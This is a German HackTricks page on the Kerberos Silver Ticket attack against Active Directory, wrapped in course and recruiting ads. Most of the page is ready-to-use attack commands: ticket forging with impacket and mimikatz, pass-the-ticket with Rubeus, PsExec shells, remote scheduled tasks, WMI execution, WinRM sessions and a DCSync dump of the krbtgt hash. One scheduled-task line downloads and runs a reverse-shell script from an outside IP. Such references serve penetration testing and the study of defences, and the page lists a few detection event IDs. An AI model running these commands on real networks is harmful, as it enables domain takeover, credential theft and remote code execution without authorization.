# Silberticket

<details>

<summary>Lernen Sie das Hacken von AWS von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie an einer Karriere im Hacking interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (fließendes Polnisch in Wort und Schrift erforderlich).

{% embed url="https://www.stmcyber.com/careers" %}

## Silberticket

Der Angriff mit dem **Silberticket** beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf dem **Erlangen des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computerkontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und sich als beliebiger Benutzer ausgeben, wobei in der Regel administrative Privilegien angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger erkennbar ist.

Für das Erstellen von Tickets werden verschiedene Tools verwendet, abhängig vom Betriebssystem:

### Unter Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Auf Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS-Dienst wird als häufiges Ziel für den Zugriff auf das Dateisystem des Opfers hervorgehoben, aber auch andere Dienste wie HOST und RPCSS können für Aufgaben und WMI-Abfragen ausgenutzt werden.

## Verfügbare Dienste

| Diensttyp                                 | Dienst-Silbertickets                                                     |
| ----------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell-Remoting                       | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                     | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nach WINRM fragen:</p> |
| Geplante Aufgaben                         | HOST                                                                       |
| Windows-Dateifreigabe, auch psexec        | CIFS                                                                       |
| LDAP-Operationen, einschließlich DCSync   | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Goldene Tickets                           | krbtgt                                                                     |

Mit **Rubeus** können Sie alle diese Tickets mit dem Parameter anfordern:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Ereignis-IDs für Silbertickets

* 4624: Kontoanmeldung
* 4634: Kontoabmeldung
* 4672: Administratoranmeldung

## Missbrauch von Diensttickets

In den folgenden Beispielen nehmen wir an, dass das Ticket unter Verwendung des Administrator-Kontos abgerufen wird.

### CIFS

Mit diesem Ticket können Sie über **SMB** auf den Ordner `C$` und `ADMIN$` zugreifen (sofern sie freigegeben sind) und Dateien auf einen Teil des Remote-Dateisystems kopieren, indem Sie einfach Folgendes tun:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sie können auch eine Shell im Host erhalten oder beliebige Befehle mit **psexec** ausführen:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Mit dieser Berechtigung können Sie geplante Aufgaben in entfernten Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets können Sie **WMI im Zielsystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Finde **weitere Informationen zu wmiexec** auf der folgenden Seite:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Mit WinRM-Zugriff auf einen Computer kannst du **darauf zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Überprüfen Sie die folgende Seite, um **weitere Möglichkeiten zur Verbindung mit einem Remote-Host über WinRM** zu erfahren:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Beachten Sie, dass **WinRM aktiv und im Hörmodus** auf dem Remote-Computer sein muss, um darauf zugreifen zu können.
{% endhint %}

### LDAP

Mit diesem Privileg können Sie die DC-Datenbank mithilfe von **DCSync** dumpen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahren Sie mehr über DCSync** auf der folgenden Seite:

## Referenzen
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (_fließendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Erfahren Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
